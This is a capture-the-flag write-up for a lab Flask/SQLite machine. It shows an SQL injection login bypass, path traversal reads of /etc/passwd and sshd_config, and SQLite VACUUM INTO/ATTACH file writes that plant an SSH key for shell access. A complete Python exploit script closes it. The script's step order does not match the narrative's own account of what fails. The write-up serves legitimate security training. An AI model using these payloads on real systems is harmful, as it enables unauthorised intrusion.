# Squeaky Clean - Boot2Root

**Challenge:** Boot2Root (Step 1: Initial Access)  
**Target:** `http://squeaky-clean.cfire`  
**Date:** 2026-03-04

---

## Overview

A Flask web application running SQLite. The attack chain to initial shell access is:

1. **SQL Injection** via `executescript()` → login bypass
2. **Path Traversal** via `?file=` → information gathering
3. **SQLite `VACUUM INTO` + `ATTACH DATABASE`** → arbitrary file write
4. **SSH key injection** into `authorized_keys2` → shell as `user`

---

## I noticed an SQL injection in the login-form (blackbox testing)

**Vulnerability 1 — SQL Injection via `executescript()`**

```python
query = f"""
SELECT * FROM users
WHERE username = '{username}'
AND password = '{password}';
"""
cursor.executescript(query)   # runs arbitrary multi-statement SQL
```

`cursor.executescript()` accepts multiple semicolon-separated statements. This is the primary write primitive — any SQL statement can be injected, including `ATTACH DATABASE`, `CREATE TABLE`, `INSERT`, and `VACUUM INTO`.

Login bypass payload:
```
username: admin
password: 'OR''='
```

**Vulnerability 2 — Path Traversal on `/dashboard`**

```python
file_to_read = "./" + request.args.get("file")
with open(file_to_read, "r") as f:
    content += "<pre>" + f.read() + "</pre>"
```

No sanitisation on the `file` parameter. Accessible after logging in via the SQLi bypass.

---

## Information Gathering (Path Traversal)

After logging in with the SQLi bypass, the following files were read via `GET /dashboard?file=<path>`:


- `/etc/passwd` User `user` (uid 1000) exists, SSH daemon running
- `/proc/self/environ` App runs as `user`, CWD is `/home/user/app`
- `/home/user/.ssh/authorized_keys` Contains one existing ed25519 key (`admin@private-desktop`)
- `/etc/ssh/sshd_config` | `Include /etc/ssh/sshd_config.d/*.conf`; `AuthorizedKeysFile` line is **commented out** (defaults to `.ssh/authorized_keys`)
- `/home/user/app/templates/login.html` Confirms templates directory path
- `/home/user/app/admin_login.log` Confirms app writes files to `/home/user/app/`

Key observations:
- No private key readable (`id_rsa` does not exist)
- `templates/` directory is readable but **not writable** by the app process
- `/home/user/app/` and `/tmp/` are writable (confirmed by ATTACH succeeding)
- `/home/user/.ssh/` is writable
- The sshd `AuthorizedKeysFile` default on Debian includes `.ssh/authorized_keys2` (legacy fallback, still active)

---

## Exploitation

### Attempt 1 — SSTI via `ATTACH DATABASE` to `login.html`

Initial plan: ATTACH to `templates/login.html`, insert a Jinja2 SSTI payload, trigger rendering.

**Failed** because `login.html` already exists as valid HTML. SQLite's `ATTACH DATABASE` refuses to open a non-SQLite file:
```
SQL Error: file is not a database
```

### Attempt 2 — `VACUUM INTO` login.html

`VACUUM INTO 'path'` creates a fresh SQLite DB at `path`. Unlike ATTACH, it is designed to write a new file. However, if the destination file **already exists**, most SQLite builds (3.27+) refuse with:
```
SQL Error: file is not a database
```

The `templates/` directory also turned out to not be writable via absolute path, making this path dead.

### Successful Path — SSH Key Injection via `VACUUM INTO` + `ATTACH`

Since `.ssh/` is writable and `authorized_keys2` did **not** exist, `VACUUM INTO` succeeds on a new path:

**Step 1: Create a valid SQLite DB at `authorized_keys2`**

SQL injected via the password field:
```sql
'; VACUUM INTO '/home/user/.ssh/authorized_keys2';--
```

This creates a fresh SQLite DB at `/home/user/.ssh/authorized_keys2`.

**Step 2: ATTACH to the new SQLite file and insert the public key**

`authorized_keys2` is now a valid SQLite DB, so ATTACH works:
```sql
'; ATTACH DATABASE '/home/user/.ssh/authorized_keys2' AS k;
CREATE TABLE IF NOT EXISTS k.t (c TEXT);
DELETE FROM k.t;
INSERT INTO k.t (c) VALUES (char(10)||'ssh-ed25519 AAAA...key...'||char(10));--
```

The `char(10)` prefix/suffix because it works as a newline

**Step 3: SSH in**

```bash
ssh-keygen -t ed25519 -f /tmp/ctf_key -N ""
# inject /tmp/ctf_key.pub via the pyhton script later in this writeup
ssh -i /tmp/ctf_key user@squeaky-clean.cfire
```

Shell obtained as `user`.

---

## Why `authorized_keys2` Works

Despite the `AuthorizedKeysFile` line in `sshd_config` being commented out, Debian's compiled-in default for OpenSSH is:

```
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
```

This is a legacy fallback that sshd still checks when no explicit override is configured. The comment in `sshd_config` even warns: *"Expect .ssh/authorized_keys2 to be disregarded by default in future."* — meaning it still works now.

---

## Summary

```
- SQL Injection (executescript)
- Login bypass ('OR''=')
- Path Traversal (?file=) → enumerate files, confirm .ssh/ writable
- VACUUM INTO /home/user/.ssh/authorized_keys2   (new SQLite DB)
- ATTACH DATABASE authorized_keys2
- INSERT public key with char(10) newlines
- ssh -i ctf_key user@target
```

---

## Script

```python
import requests


BASE = "http://squeaky-clean.cfire"
password = "'OR''='"
SSH_AUTH_KEYS = "/home/user/.ssh/authorized_keys"
MY_PUBKEY = "PUBLIC_KEY"  # e.g. ssh-ed25519 AAAA... you@host

def _attach_and_insert_key(s, path=None):
    if path is None:
        path = SSH_AUTH_KEYS
    attach = (
        f"'; ATTACH DATABASE '{path}' AS k; "
        "CREATE TABLE IF NOT EXISTS k.t (c TEXT); "
        "DELETE FROM k.t; "
        f"INSERT INTO k.t (c) VALUES (char(10)||'{MY_PUBKEY}'||char(10));--"
    )
    r = s.post(BASE + "/", data={"username": "admin", "password": attach})
    if "SQL Error" not in r.text:
        print(f"Key inserted into {path}")
        print(f"Use:  ssh -i /tmp/ctf_key user@squeaky-clean.cfire")
    else:
        print(f"attack failed: {r.text[10:150]}")

def ssh_key_inject():
    s = requests.Session()
    s.post(BASE + "/", data={"username": "admin", "password": password})

    ak2 = "/home/user/.ssh/authorized_keys2"
    print(f"\nRe-injecting key into {ak2} with newline fix...")
    _attach_and_insert_key(s, path=ak2)

    vac = f"'; VACUUM INTO '{SSH_AUTH_KEYS}';--"
    r = s.post(BASE + "/", data={"username": "admin", "password": vac})
    if "SQL Error" not in r.text:
        print("VACUUM INTO authorized_keys succeeded!")
        _attach_and_insert_key(s, path=SSH_AUTH_KEYS)
    else:
        print(f"exploit might have failed.. or not {r.text}")
        print("try ssh -i /tmp/ctf_key user@squeaky-clean.cfire")


if __name__ == "__main__":
    ssh_key_inject()

```
```bash
python3 request.py
ssh -i /tmp/ctf_key user@squeaky-clean.cfire
```
